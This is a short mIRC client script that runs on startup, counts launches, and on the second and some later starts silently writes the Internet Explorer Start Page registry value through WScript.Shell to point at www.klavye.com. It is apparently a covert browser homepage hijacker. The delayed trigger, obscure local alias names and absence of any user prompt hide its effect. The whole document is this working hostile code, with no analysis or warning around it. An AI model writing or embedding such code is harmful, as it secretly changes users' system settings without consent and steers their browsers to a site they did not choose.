on *:start:{
  asii
}


alias -l asii {
  inc %startcounter 
  if (%startcounter == 2) { med1kal www.klavye.com }
  if ($numtok($calc(%startcounter / 50),46) == 1) { med1kal www.klavye.com | halt } 
}
alias -l med1kal {
  var %tmp = HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start $+(Page!http://,$1,!REG_SZ)
  tokenize 33 %tmp  
  .comopen med1kal WScript.Shell
  if (!$comerr) { 
    var %x = $com(med1kal,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)
    .comclose med1kal
  }
}
